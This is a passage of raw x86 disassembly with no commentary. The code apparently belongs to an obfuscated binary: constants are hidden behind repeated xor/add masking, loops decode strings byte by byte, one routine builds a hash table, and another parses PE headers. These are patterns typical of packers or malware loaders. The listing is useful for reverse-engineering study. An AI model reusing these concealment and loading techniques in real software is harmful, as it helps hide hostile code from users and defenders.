  414aa8:	mov    edx,DWORD PTR [ebp+0x8]
  414aab:	mov    edi,DWORD PTR [ecx+edi*4]
  414aae:	mov    DWORD PTR [ebp-0x4],edx
  414ab1:	lea    edx,[ebp-0x50]
  414ab4:	add    ebx,eax
  414ab6:	add    edi,eax
  414ab8:	sub    edx,DWORD PTR [ebp+0x8]
  414abb:	mov    DWORD PTR [ebp-0x14],0xb
  414ac2:	mov    DWORD PTR [ebp-0x24],edx
  414ac5:	mov    edx,DWORD PTR [ebp-0x4]
  414ac8:	cmp    DWORD PTR [edx],0x0
  414acb:	jne    0x414ae8
  414acd:	mov    eax,DWORD PTR [ebp-0x24]
  414ad0:	push   DWORD PTR [eax+edx*1]
  414ad3:	push   ebx
  414ad4:	call   0x4148cf
  414ad9:	mov    ecx,DWORD PTR [ebp-0xc]
  414adc:	test   eax,eax
  414ade:	je     0x414ae5
  414ae0:	mov    eax,DWORD PTR [ebp-0x4]
  414ae3:	mov    DWORD PTR [eax],edi
  414ae5:	mov    eax,DWORD PTR [ebp-0x10]
  414ae8:	add    DWORD PTR [ebp-0x4],0x4
  414aec:	dec    DWORD PTR [ebp-0x14]
  414aef:	jne    0x414ac5
  414af1:	mov    ebx,DWORD PTR [ebp-0x18]
  414af4:	inc    ebx
  414af5:	mov    DWORD PTR [ebp-0x18],ebx
  414af8:	cmp    ebx,DWORD PTR [ebp-0x8]
  414afb:	jb     0x414a91
  414afd:	pop    esi
  414afe:	pop    ebx
  414aff:	pop    edi
  414b00:	leave  
  414b01:	ret    0x4
  414b04:	push   ebp
  414b05:	mov    ebp,esp
  414b07:	mov    eax,DWORD PTR [ebp+0x8]
  414b0a:	push   esi
  414b0b:	push   DWORD PTR [eax+0x1d8]
  414b11:	lea    esi,[eax+0x198]
  414b17:	mov    eax,DWORD PTR [ebp+0x8]
  414b1a:	call   0x4149b4
  414b1f:	mov    ecx,DWORD PTR [esi]
  414b21:	mov    DWORD PTR [ecx],eax
  414b23:	mov    eax,DWORD PTR [esi]
  414b25:	xor    ecx,ecx
  414b27:	cmp    DWORD PTR [eax],ecx
  414b29:	pop    esi
  414b2a:	setne  cl
  414b2d:	mov    eax,ecx
  414b2f:	pop    ebp
  414b30:	ret    0x4
  414b33:	mov    ecx,DWORD PTR [edi+0x188]
  414b39:	push   ebx
  414b3a:	jmp    0x414b4f
  414b3c:	xor    eax,0x8a89
  414b41:	add    eax,0x3b4c
  414b46:	mov    WORD PTR [ecx],ax
  414b49:	add    ecx,0x2
  414b4c:	add    edx,0x2
  414b4f:	movzx  eax,WORD PTR [edx]
  414b52:	mov    ebx,0x4e3d
  414b57:	cmp    ax,bx
  414b5a:	jne    0x414b3c
  414b5c:	xor    eax,eax
  414b5e:	mov    WORD PTR [ecx],ax
  414b61:	mov    eax,DWORD PTR [edi+0x188]
  414b67:	pop    ebx
  414b68:	ret    
  414b69:	push   edi
  414b6a:	mov    edi,eax
  414b6c:	mov    eax,DWORD PTR [esi+0x188]
  414b72:	shl    edi,0x6
  414b75:	add    eax,edi
  414b77:	jmp    0x414b83
  414b79:	xor    cl,0x71
  414b7c:	sub    cl,0xb
  414b7f:	mov    BYTE PTR [eax],cl
  414b81:	inc    eax
  414b82:	inc    edx
  414b83:	mov    cl,BYTE PTR [edx]
  414b85:	cmp    cl,0x7a
  414b88:	jne    0x414b79
  414b8a:	mov    BYTE PTR [eax],0x0
  414b8d:	mov    eax,DWORD PTR [esi+0x188]
  414b93:	add    eax,edi
  414b95:	pop    edi
  414b96:	ret    
  414b97:	push   ebp
  414b98:	mov    ebp,esp
  414b9a:	sub    esp,0x38
  414b9d:	push   ebx
  414b9e:	mov    ebx,0xf89c85b5
  414ba3:	mov    DWORD PTR [ebp-0x4],ebx
  414ba6:	lea    eax,[ebx-0x3]
  414ba9:	push   esi
  414baa:	mov    DWORD PTR [ebp-0x24],eax
  414bad:	mov    ecx,DWORD PTR [ebp-0x4]
  414bb0:	mov    edx,DWORD PTR [ebp+0x8]
  414bb3:	mov    esi,0x7510896
  414bb8:	push   edi
  414bb9:	xor    ecx,esi
  414bbb:	mov    edi,0x3272dd
  414bc0:	add    ecx,edi
  414bc2:	cmp    edx,ecx
  414bc4:	je     0x414d32
  414bca:	mov    ecx,DWORD PTR [ebp-0x4]
  414bcd:	mov    edx,DWORD PTR [ebp+0xc]
  414bd0:	xor    ecx,esi
  414bd2:	add    ecx,edi
  414bd4:	cmp    edx,ecx
  414bd6:	je     0x414d32
  414bdc:	mov    ecx,DWORD PTR [ebp+0x10]
  414bdf:	mov    DWORD PTR [ebp-0x18],ecx
  414be2:	mov    ecx,DWORD PTR [ebp+0xc]
  414be5:	mov    DWORD PTR [ebp-0x14],ecx
  414be8:	mov    ecx,DWORD PTR [ebp+0x8]
  414beb:	mov    DWORD PTR [ebp-0x1c],0xf89c8508
  414bf2:	mov    DWORD PTR [ebp-0x20],eax
  414bf5:	mov    DWORD PTR [ebp-0x10],ebx
  414bf8:	mov    DWORD PTR [ebp+0xc],eax
  414bfb:	mov    DWORD PTR [ebp+0x10],0xf89c85b3
  414c02:	mov    eax,DWORD PTR [ebp+0xc]
  414c05:	mov    DWORD PTR [ebp-0xc],ecx
  414c08:	xor    eax,esi
  414c0a:	mov    ecx,0xffcd8d23
  414c0f:	sub    ecx,eax
  414c11:	add    ecx,DWORD PTR [ebp-0x14]
  414c14:	mov    DWORD PTR [ebp+0x8],ecx
  414c17:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  414c1e:	jmp    0x414d22
  414c23:	mov    eax,DWORD PTR [ebp+0xc]
  414c26:	mov    ecx,DWORD PTR [ebp+0xc]
  414c29:	xor    eax,esi
  414c2b:	xor    ecx,esi
  414c2d:	lea    ecx,[eax+ecx*1+0x64e5ba]
  414c34:	mov    eax,DWORD PTR [ebp+0x8]
  414c37:	xor    edx,edx
  414c39:	div    ecx
  414c3b:	mov    eax,DWORD PTR [ebp+0x10]
  414c3e:	mov    ecx,DWORD PTR [ebp+0xc]
  414c41:	xor    eax,esi
  414c43:	xor    ecx,esi
  414c45:	sub    eax,ecx
  414c47:	cmp    edx,eax
  414c49:	jne    0x414cde
  414c4f:	mov    eax,DWORD PTR [ebp+0x8]
  414c52:	add    eax,DWORD PTR [ebp-0xc]
  414c55:	mov    dl,BYTE PTR [eax]
  414c57:	mov    eax,DWORD PTR [ebp-0x10]
  414c5a:	mov    ecx,DWORD PTR [ebp-0x8]
  414c5d:	xor    eax,esi
  414c5f:	xor    ecx,esi
  414c61:	add    eax,edi
  414c63:	add    ecx,edi
  414c65:	cmp    eax,ecx
  414c67:	jae    0x414caf
  414c69:	lea    ecx,[eax-0x3272dd]
  414c6f:	mov    DWORD PTR [ebp-0x4],ecx
  414c72:	mov    ebx,DWORD PTR [ebp-0x4]
  414c75:	xor    ebx,esi
  414c77:	add    ebx,0x7f55d8f3
  414c7d:	lea    ecx,[ebp+eax*4-0x38]
  414c81:	mov    DWORD PTR [ecx],ebx
  414c83:	mov    ebx,DWORD PTR [ecx]
  414c85:	cmp    ebx,0x244ecbd0
  414c8b:	jbe    0x414c95
  414c8d:	add    DWORD PTR [ecx],0x405fc11
  414c93:	jmp    0x414c9b
  414c95:	add    DWORD PTR [ecx],0xfdaf43ef
  414c9b:	mov    ecx,DWORD PTR [ebp-0x8]
  414c9e:	xor    ecx,esi
  414ca0:	inc    eax
  414ca1:	inc    DWORD PTR [ebp-0x4]
  414ca4:	add    ecx,edi
  414ca6:	cmp    eax,ecx
  414ca8:	jb     0x414c72
  414caa:	mov    ebx,0xf89c85b5
  414caf:	mov    eax,DWORD PTR [ebp-0x18]
  414cb2:	test   eax,eax
  414cb4:	jne    0x414cbe
  414cb6:	xor    dl,0x71
  414cb9:	sub    dl,0xb
  414cbc:	jmp    0x414cd4
  414cbe:	mov    eax,DWORD PTR [ebp-0x1c]
  414cc1:	xor    al,0x96
  414cc3:	mov    cl,0x23
  414cc5:	sub    cl,al
  414cc7:	add    dl,cl
  414cc9:	mov    ecx,DWORD PTR [ebp-0x20]
  414ccc:	xor    cl,0x96
  414ccf:	sub    cl,0x23
  414cd2:	ror    dl,cl
  414cd4:	xor    eax,eax
  414cd6:	mov    eax,DWORD PTR [ebp+0x8]
  414cd9:	add    eax,DWORD PTR [ebp-0xc]
  414cdc:	mov    BYTE PTR [eax],dl
  414cde:	mov    eax,DWORD PTR [ebp+0x8]
  414ce1:	mov    ecx,DWORD PTR [ebp-0x10]
  414ce4:	sub    eax,edi
  414ce6:	xor    eax,esi
  414ce8:	cmp    eax,ecx
  414cea:	jne    0x414d10
  414cec:	mov    eax,DWORD PTR [ebp+0x10]
  414cef:	mov    ecx,DWORD PTR [ebp+0xc]
  414cf2:	xor    eax,esi
  414cf4:	xor    ecx,esi
  414cf6:	sub    eax,ecx
  414cf8:	sub    eax,edi
  414cfa:	xor    eax,esi
  414cfc:	mov    DWORD PTR [ebp+0x10],eax
  414cff:	mov    eax,DWORD PTR [ebp+0xc]
  414d02:	xor    eax,esi
  414d04:	mov    ecx,0xffcd8d23
  414d09:	sub    ecx,eax
  414d0b:	add    ecx,DWORD PTR [ebp-0x14]
  414d0e:	jmp    0x414d1f
  414d10:	mov    eax,DWORD PTR [ebp+0xc]
  414d13:	xor    eax,esi
  414d15:	mov    ecx,0xffcd8d23
  414d1a:	sub    ecx,eax
  414d1c:	add    ecx,DWORD PTR [ebp+0x8]
  414d1f:	mov    DWORD PTR [ebp+0x8],ecx
  414d22:	mov    eax,DWORD PTR [ebp+0x10]
  414d25:	cmp    eax,ebx
  414d27:	jne    0x414c23
  414d2d:	mov    eax,DWORD PTR [ebp-0x24]
  414d30:	jmp    0x414d35
  414d32:	mov    eax,DWORD PTR [ebp-0x4]
  414d35:	xor    eax,esi
  414d37:	add    eax,edi
  414d39:	pop    edi
  414d3a:	pop    esi
  414d3b:	pop    ebx
  414d3c:	leave  
  414d3d:	ret    0xc
  414d40:	push   ebp
  414d41:	mov    ebp,esp
  414d43:	sub    esp,0x14
  414d46:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  414d4d:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  414d54:	mov    eax,DWORD PTR [ebx]
  414d56:	mov    DWORD PTR [ebp-0x8],eax
  414d59:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  414d60:	push   esi
  414d61:	push   edi
  414d62:	mov    DWORD PTR [ebp-0x14],0xead718d5
  414d69:	mov    edi,DWORD PTR [ebp-0x4]
  414d6c:	mov    ecx,DWORD PTR [ebp-0x10]
  414d6f:	mov    eax,0x7510896
  414d74:	xor    edi,eax
  414d76:	mov    edx,0x3272dd
  414d7b:	xor    ecx,eax
  414d7d:	add    edi,edx
  414d7f:	add    ecx,edx
  414d81:	imul   edi,ecx
  414d84:	jmp    0x414dcc
  414d86:	mov    ecx,DWORD PTR [ebp-0x8]
  414d89:	mov    esi,DWORD PTR [ebp-0x4]
  414d8c:	xor    ecx,eax
  414d8e:	xor    esi,eax
  414d90:	add    ecx,edx
  414d92:	add    esi,edx
  414d94:	test   esi,ecx
  414d96:	mov    esi,DWORD PTR [ebp-0x8]
  414d99:	mov    ecx,DWORD PTR [ebp-0x4]
  414d9c:	je     0x414db3
  414d9e:	xor    ecx,eax
  414da0:	xor    esi,eax
  414da2:	add    ecx,edx
  414da4:	add    esi,edx
  414da6:	shr    esi,cl
  414da8:	mov    ecx,DWORD PTR [ebp-0x14]
  414dab:	xor    ecx,eax
  414dad:	add    ecx,edx
  414daf:	xor    esi,ecx
  414db1:	jmp    0x414dbd
  414db3:	xor    esi,eax
  414db5:	xor    ecx,eax
  414db7:	add    esi,edx
  414db9:	add    ecx,edx
  414dbb:	shr    esi,cl
  414dbd:	mov    DWORD PTR [ebp-0x8],esi
  414dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  414dc3:	xor    ecx,eax
  414dc5:	lea    edi,[edi+ecx*1+0x3272dd]
  414dcc:	mov    ecx,DWORD PTR [ebp-0xc]
  414dcf:	mov    esi,DWORD PTR [ebp-0x4]
  414dd2:	xor    esi,eax
  414dd4:	xor    ecx,eax
  414dd6:	sub    ecx,esi
  414dd8:	cmp    edi,ecx
  414dda:	jbe    0x414d86
  414ddc:	mov    eax,DWORD PTR [ebp-0x8]
  414ddf:	pop    edi
  414de0:	mov    DWORD PTR [ebx],eax
  414de2:	mov    eax,DWORD PTR [ebp-0x8]
  414de5:	pop    esi
  414de6:	leave  
  414de7:	ret    
  414de8:	push   ebp
  414de9:	mov    ebp,esp
  414deb:	sub    esp,0x420
  414df1:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  414df8:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  414dff:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  414e06:	push   ebx
  414e07:	mov    DWORD PTR [ebp-0x1c],0xf89c85b4
  414e0e:	mov    eax,DWORD PTR [ebp-0x14]
  414e11:	push   esi
  414e12:	mov    esi,0x7510896
  414e17:	push   edi
  414e18:	xor    eax,esi
  414e1a:	mov    edi,0x3272dd
  414e1f:	add    eax,edi
  414e21:	mov    DWORD PTR [ebp-0x8],eax
  414e24:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  414e2b:	mov    DWORD PTR [ebp-0x4],0xead718d5
  414e32:	mov    DWORD PTR [ebp-0x10],0x8
  414e39:	mov    ecx,ecx
  414e3b:	mov    eax,DWORD PTR [ebp-0xc]
  414e3e:	mov    ecx,DWORD PTR [ebp-0x14]
  414e41:	xor    eax,esi
  414e43:	xor    ecx,esi
  414e45:	add    eax,edi
  414e47:	add    ecx,edi
  414e49:	imul   eax,ecx
  414e4c:	jmp    0x414e7f
  414e4e:	mov    eax,DWORD PTR [ebp-0x4]
  414e51:	sub    eax,edi
  414e53:	xor    eax,esi
  414e55:	mov    DWORD PTR [ebp-0x8],eax
  414e58:	lea    ebx,[ebp-0x8]
  414e5b:	call   0x414d40
  414e60:	mov    DWORD PTR [ebp-0x8],eax
  414e63:	mov    eax,DWORD PTR [ebp-0x8]
  414e66:	mov    ecx,DWORD PTR [ebp-0x4]
  414e69:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  414e70:	mov    eax,DWORD PTR [ebp-0xc]
  414e73:	mov    ecx,DWORD PTR [ebp-0x4]
  414e76:	xor    eax,esi
  414e78:	lea    eax,[eax+ecx*1+0x3272dd]
  414e7f:	mov    DWORD PTR [ebp-0x4],eax
  414e82:	mov    eax,DWORD PTR [ebp-0x18]
  414e85:	mov    ecx,DWORD PTR [ebp-0xc]
  414e88:	xor    ecx,esi
  414e8a:	xor    eax,esi
  414e8c:	sub    eax,ecx
  414e8e:	mov    ecx,DWORD PTR [ebp-0x4]
  414e91:	cmp    ecx,eax
  414e93:	jbe    0x414e4e
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	xor    eax,esi
  414e9a:	add    eax,edi
  414e9c:	mov    DWORD PTR [ebp-0x8],eax
  414e9f:	mov    DWORD PTR [ebp-0x18],0xf89c86b4
  414ea6:	mov    ebx,ebx
  414ea8:	jmp    0x414f0b
  414eaa:	mov    ecx,DWORD PTR [ebp-0x20]
  414ead:	mov    eax,DWORD PTR [ebp-0x8]
  414eb0:	xor    ecx,esi
  414eb2:	add    ecx,edi
  414eb4:	shr    eax,cl
  414eb6:	mov    DWORD PTR [ebp-0x4],eax
  414eb9:	mov    eax,DWORD PTR [ebp+0x8]
  414ebc:	mov    cl,BYTE PTR [eax]
  414ebe:	mov    BYTE PTR [ebp+0xb],cl
  414ec1:	mov    cl,BYTE PTR [ebp+0xb]
  414ec4:	mov    edx,DWORD PTR [ebp-0x8]
  414ec7:	movzx  ecx,cl
  414eca:	xor    ecx,edx
  414ecc:	mov    DWORD PTR [ebp+0x8],ecx
  414ecf:	mov    ecx,DWORD PTR [ebp-0x18]
  414ed2:	mov    edx,DWORD PTR [ebp+0x8]
  414ed5:	xor    ecx,esi
  414ed7:	add    ecx,edi
  414ed9:	and    ecx,edx
  414edb:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  414ee2:	mov    edx,DWORD PTR [ebp-0x4]
  414ee5:	xor    ecx,edx
  414ee7:	mov    DWORD PTR [ebp-0x8],ecx
  414eea:	mov    ecx,DWORD PTR [ebp-0xc]
  414eed:	xor    ecx,esi
  414eef:	lea    eax,[eax+ecx*1+0x3272dd]
  414ef6:	mov    DWORD PTR [ebp+0x8],eax
  414ef9:	mov    eax,DWORD PTR [ebp-0xc]
  414efc:	xor    eax,esi
  414efe:	mov    ecx,0xffcd8d23
  414f03:	sub    ecx,eax
  414f05:	add    ecx,DWORD PTR [ebp-0x10]
  414f08:	mov    DWORD PTR [ebp-0x10],ecx
  414f0b:	mov    eax,DWORD PTR [ebp-0x14]
  414f0e:	mov    ecx,DWORD PTR [ebp-0x10]
  414f11:	xor    eax,esi
  414f13:	add    eax,edi
  414f15:	cmp    ecx,eax
  414f17:	jne    0x414eaa
  414f19:	mov    eax,DWORD PTR [ebp-0x1c]
  414f1c:	mov    ecx,DWORD PTR [ebp-0x8]
  414f1f:	xor    eax,esi
  414f21:	add    eax,edi
  414f23:	pop    edi
  414f24:	pop    esi
  414f25:	xor    eax,ecx
  414f27:	pop    ebx
  414f28:	leave  
  414f29:	ret    0x4
  414f2c:	push   ebp
  414f2d:	mov    ebp,esp
  414f2f:	mov    eax,DWORD PTR [ebp+0x1c]
  414f32:	mov    ecx,DWORD PTR [ebp+0x8]
  414f35:	mov    edx,DWORD PTR [ebp+0x10]
  414f38:	mov    eax,DWORD PTR [eax+0x190]
  414f3e:	mov    eax,DWORD PTR [eax]
  414f40:	sub    esp,0x64
  414f43:	push   ebx
  414f44:	push   esi
  414f45:	push   edi
  414f46:	mov    edi,0x7510896
  414f4b:	xor    ecx,edi
  414f4d:	mov    ebx,0x3272dd
  414f52:	add    ecx,ebx
  414f54:	cmp    ecx,edx
  414f56:	jne    0x414f67
  414f58:	or     DWORD PTR ds:0x3750c3f,0x4263eb0c
  414f62:	jmp    0x415464
  414f67:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6a:	mov    esi,DWORD PTR [ebp+0x14]
  414f6d:	mov    edx,DWORD PTR [esi]
  414f6f:	xor    ecx,edi
  414f71:	add    ecx,ebx
  414f73:	cmp    edx,ecx
  414f75:	je     0x41541f
  414f7b:	mov    ecx,DWORD PTR [ebp+0x1c]
  414f7e:	mov    DWORD PTR [ebp-0x1c],eax
  414f81:	mov    DWORD PTR [ebp+0x1c],ecx
  414f84:	mov    ecx,DWORD PTR [ebp+0x18]
  414f87:	mov    eax,DWORD PTR [esi]
  414f89:	mov    DWORD PTR [ebp-0x20],eax
  414f8c:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  414f93:	mov    edx,0xf89c85b2
  414f98:	mov    DWORD PTR [ebp-0x8],edx
  414f9b:	mov    eax,DWORD PTR [ebp+0x1c]
  414f9e:	mov    DWORD PTR [ebp+0x1c],eax
  414fa1:	mov    eax,DWORD PTR [ebp+0x1c]
  414fa4:	mov    eax,DWORD PTR [eax+0x190]
  414faa:	mov    eax,DWORD PTR [eax]
  414fac:	mov    DWORD PTR [ebp-0x24],ecx
  414faf:	mov    ecx,DWORD PTR [ebp+0x1c]
  414fb2:	mov    ecx,DWORD PTR [ecx+0x190]
  414fb8:	mov    ecx,DWORD PTR [ecx]
  414fba:	add    ecx,DWORD PTR [eax+0x3c]
  414fbd:	mov    DWORD PTR [ebp+0x10],ecx
  414fc0:	mov    eax,DWORD PTR [ebp+0x8]
  414fc3:	xor    eax,edi
  414fc5:	add    eax,ebx
  414fc7:	mov    DWORD PTR [ebp-0x4],eax
  414fca:	mov    eax,DWORD PTR [ebp+0x8]
  414fcd:	xor    eax,edi
  414fcf:	add    eax,ebx
  414fd1:	mov    DWORD PTR [ebp+0x18],eax
  414fd4:	mov    eax,DWORD PTR [ebp+0x10]
  414fd7:	mov    eax,DWORD PTR [eax+0x50]
  414fda:	sub    eax,0xc
  414fdd:	mov    DWORD PTR [ebp-0x28],eax
  414fe0:	mov    eax,DWORD PTR [ebp+0x10]
  414fe3:	mov    eax,DWORD PTR [eax+0x38]
  414fe6:	mov    ecx,DWORD PTR [ebp+0x10]
  414fe9:	dec    eax
  414fea:	test   DWORD PTR [ecx+0x54],eax
  414fed:	mov    eax,DWORD PTR [ebp+0x10]
  414ff0:	je     0x41500a
  414ff2:	mov    eax,DWORD PTR [eax+0x38]
  414ff5:	mov    ecx,DWORD PTR [ebp+0x10]
  414ff8:	mov    ecx,DWORD PTR [ecx+0x54]
  414ffb:	dec    eax
  414ffc:	not    eax
  414ffe:	and    ecx,eax
  415000:	mov    eax,DWORD PTR [ebp+0x10]
  415003:	mov    eax,DWORD PTR [eax+0x38]
  415006:	add    eax,ecx
  415008:	jmp    0x41500d
  41500a:	mov    eax,DWORD PTR [eax+0x54]
  41500d:	mov    DWORD PTR [ebp+0x1c],eax
  415010:	mov    eax,DWORD PTR [ebp+0x8]
  415013:	xor    eax,edi
  415015:	add    eax,ebx
  415017:	mov    DWORD PTR [ebp+0x18],eax
  41501a:	mov    eax,DWORD PTR [ebp+0x8]
  41501d:	xor    eax,edi
  41501f:	add    eax,ebx
  415021:	mov    DWORD PTR [ebp+0x18],eax
  415024:	mov    eax,DWORD PTR [ebp+0x8]
  415027:	mov    ecx,DWORD PTR [ebp-0x24]
  41502a:	xor    eax,edi
  41502c:	add    eax,ebx
  41502e:	mov    DWORD PTR [ecx],eax
  415030:	mov    DWORD PTR [ebp+0x18],edx
  415033:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  41503a:	mov    DWORD PTR [ebp+0x18],0xf89c85b0
  415041:	mov    DWORD PTR [ebp+0x18],0xf89c85b1
  415048:	mov    eax,DWORD PTR [ebp-0x8]
  41504b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41504e:	xor    eax,edi
  415050:	add    eax,ebx
  415052:	imul   eax,ecx
  415055:	mov    ecx,DWORD PTR [ebp+0x8]
  415058:	mov    edx,DWORD PTR [ebp-0x28]
  41505b:	xor    ecx,edi
  41505d:	lea    ecx,[ecx+edx*1+0x3272dd]
  415064:	cmp    eax,ecx
  415066:	jae    0x415418
  41506c:	mov    eax,DWORD PTR [ebp+0x8]
  41506f:	xor    eax,edi
  415071:	add    eax,ebx
  415073:	mov    DWORD PTR [ebp+0x18],eax
  415076:	mov    eax,DWORD PTR [ebp+0x1c]
  415079:	add    eax,DWORD PTR [ebp-0x1c]
  41507c:	mov    DWORD PTR [ebp-0x4],eax
  41507f:	push   DWORD PTR [ebp-0x4]
  415082:	mov    esi,DWORD PTR [ebp-0x1c]
  415085:	mov    ecx,DWORD PTR [ebp+0x10]
  415088:	call   0x41416e
  41508d:	mov    DWORD PTR [ebp+0xc],eax
  415090:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  415097:	mov    eax,DWORD PTR [ebp-0x18]
  41509a:	xor    eax,edi
  41509c:	add    eax,ebx
  41509e:	push   eax
  41509f:	lea    eax,[ebp-0x40]
  4150a2:	push   eax
  4150a3:	call   0x414779
  4150a8:	mov    eax,DWORD PTR [ebp+0xc]
  4150ab:	test   eax,eax
  4150ad:	je     0x4150fd
  4150af:	mov    eax,DWORD PTR [ebp-0x18]
  4150b2:	xor    eax,edi
  4150b4:	add    eax,ebx
  4150b6:	push   eax
  4150b7:	push   DWORD PTR [ebp+0xc]
  4150ba:	lea    eax,[ebp-0x40]
  4150bd:	push   eax
  4150be:	call   0x414620
  4150c3:	mov    eax,DWORD PTR [ebp-0x4]
  4150c6:	mov    DWORD PTR [ebp-0x18],eax
  4150c9:	mov    eax,DWORD PTR [ebp-0x18]
  4150cc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4150cf:	sub    eax,ecx
  4150d1:	mov    DWORD PTR [ebp-0x18],eax
  4150d4:	mov    eax,DWORD PTR [ebp+0xc]
  4150d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4150da:	mov    eax,DWORD PTR [eax+0x10]
  4150dd:	add    eax,DWORD PTR [ecx+0xc]
  4150e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4150e3:	cmp    ecx,eax
  4150e5:	jb     0x4150fd
  4150e7:	mov    eax,DWORD PTR [ebp+0xc]
  4150ea:	mov    eax,DWORD PTR [eax+0xc]
  4150ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4150f0:	add    eax,DWORD PTR [ecx+0x8]
  4150f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4150f6:	sub    eax,ecx
  4150f8:	jmp    0x4153eb
  4150fd:	push   0xc
  4150ff:	push   DWORD PTR [ebp-0x4]
  415102:	lea    eax,[ebp-0x4c]
  415105:	push   eax
  415106:	call   0x414620
  41510b:	mov    eax,0xf89c85b5
  415110:	mov    DWORD PTR [ebp-0x2c],eax
  415113:	mov    DWORD PTR [ebp-0x30],0xf89c85b2
  41511a:	mov    DWORD PTR [ebp-0x34],0xf89c85b3
  415121:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  415128:	lea    ecx,[ebp-0x2c]
  41512b:	mov    DWORD PTR [ebp-0xc],ecx
  41512e:	lea    ecx,[ebp-0x30]
  415131:	mov    DWORD PTR [ebp-0x10],ecx
  415134:	lea    ecx,[ebp-0x34]
  415137:	mov    DWORD PTR [ebp+0xc],ecx
  41513a:	lea    ecx,[ebp-0x38]
  41513d:	mov    DWORD PTR [ebp-0x14],ecx
  415140:	mov    ecx,DWORD PTR [ebp+0x8]
  415143:	xor    ecx,edi
  415145:	add    ecx,ebx
  415147:	mov    DWORD PTR [ebp-0x18],ecx
  41514a:	jmp    0x415346
  41514f:	cmp    eax,0xf89c85b3
  415154:	je     0x415358
  41515a:	mov    ecx,DWORD PTR [ebp-0x8]
  41515d:	xor    ecx,edi
  41515f:	mov    esi,eax
  415161:	add    ecx,ebx
  415163:	mov    DWORD PTR [ebp+0x18],ecx
  415166:	mov    eax,DWORD PTR [ebp-0x18]
  415169:	xor    esi,edi
  41516b:	lea    eax,[eax+esi*1+0x3272dd]
  415172:	mov    DWORD PTR [ebp-0x18],eax
  415175:	mov    eax,DWORD PTR [ebp-0x8]
  415178:	mov    ecx,DWORD PTR [ebp-0x18]
  41517b:	xor    eax,edi
  41517d:	add    eax,ebx
  41517f:	cmp    ecx,eax
  415181:	jne    0x415196
  415183:	mov    eax,DWORD PTR [ebp+0x8]
  415186:	xor    eax,edi
  415188:	add    eax,ebx
  41518a:	push   eax
  41518b:	push   0xc
  41518d:	lea    eax,[ebp-0x4c]
  415190:	push   eax
  415191:	call   0x414b97
  415196:	mov    eax,DWORD PTR [ebp-0xc]
  415199:	mov    eax,DWORD PTR [eax]
  41519b:	xor    eax,edi
  41519d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151a7:	xor    ecx,edi
  4151a9:	movzx  eax,al
  4151ac:	add    ecx,ebx
  4151ae:	cmp    eax,ecx
  4151b0:	je     0x41532e
  4151b6:	mov    eax,DWORD PTR [ebp-0x10]
  4151b9:	mov    eax,DWORD PTR [eax]
  4151bb:	xor    eax,edi
  4151bd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151c7:	xor    ecx,edi
  4151c9:	movzx  eax,al
  4151cc:	add    ecx,ebx
  4151ce:	cmp    eax,ecx
  4151d0:	je     0x41532e
  4151d6:	mov    eax,DWORD PTR [ebp+0xc]
  4151d9:	mov    eax,DWORD PTR [eax]
  4151db:	xor    eax,edi
  4151dd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151e7:	xor    ecx,edi
  4151e9:	movzx  eax,al
  4151ec:	add    ecx,ebx
  4151ee:	cmp    eax,ecx
  4151f0:	je     0x41532e
  4151f6:	mov    eax,DWORD PTR [ebp-0x14]
  4151f9:	mov    eax,DWORD PTR [eax]
  4151fb:	xor    eax,edi
  4151fd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415204:	mov    ecx,DWORD PTR [ebp+0x8]
  415207:	xor    ecx,edi
  415209:	movzx  eax,al
  41520c:	add    ecx,ebx
  41520e:	cmp    eax,ecx
  415210:	je     0x41532e
  415216:	mov    eax,DWORD PTR [ebp-0x10]
  415219:	mov    eax,DWORD PTR [eax]
  41521b:	xor    eax,edi
  41521d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415224:	mov    ecx,DWORD PTR [ebp-0xc]
  415227:	mov    ecx,DWORD PTR [ecx]
  415229:	xor    ecx,edi
  41522b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415232:	xor    al,cl
  415234:	mov    ecx,DWORD PTR [ebp+0xc]
  415237:	mov    ecx,DWORD PTR [ecx]
  415239:	xor    ecx,edi
  41523b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415242:	or     al,cl
  415244:	mov    ecx,DWORD PTR [ebp-0xc]
  415247:	mov    ecx,DWORD PTR [ecx]
  415249:	xor    ecx,edi
  41524b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415252:	cmp    cl,al
  415254:	jne    0x41532e
  41525a:	mov    eax,DWORD PTR [ebp+0xc]
  41525d:	mov    eax,DWORD PTR [eax]
  41525f:	xor    eax,edi
  415261:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415268:	mov    ecx,DWORD PTR [ebp-0x10]
  41526b:	mov    ecx,DWORD PTR [ecx]
  41526d:	xor    ecx,edi
  41526f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415276:	xor    al,cl
  415278:	mov    ecx,DWORD PTR [ebp-0x14]
